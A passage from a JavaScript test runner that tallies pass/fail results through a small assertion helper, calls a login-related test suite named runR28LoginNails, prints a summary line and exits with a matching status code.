    let pass = 0, fail = 0;
    const okCli = (c, label, detail) => {
      if (c) {
        pass++;
        console.log(`[PASS] ${label}`);
      } else {
        fail++;
        console.log(`[FAIL] ${label}${detail !== undefined ? ' -> ' + JSON.stringify(detail) : ''}`);
      }
      return !!c;
    };
    await runR28LoginNails({ repoDir, ok: okCli, MUT: null });
    console.log(`=== R28 NAILS SUMMARY: ${pass}/${pass + fail} passed, ${fail} failed ===`);
    process.exit(fail ? 1 : 0);
  }
}
